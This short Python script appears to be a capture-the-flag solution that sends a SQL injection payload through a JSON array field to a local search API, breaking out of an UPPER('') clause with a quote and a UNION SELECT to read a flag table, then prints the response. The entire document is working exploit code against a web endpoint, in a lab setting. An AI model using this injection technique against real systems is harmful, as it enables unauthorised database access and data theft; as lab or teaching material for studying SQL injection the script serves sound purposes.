import json
import requests
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8020")

URL = f"http://{HOST}:{PORT}"

# SELECT name FROM country WHERE code=UPPER('')')
code = ["') UNION SELECT flag FROM flag;--", "wow"]
r = requests.post(f"{URL}/api/search",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"code": code}))
print(r.text)
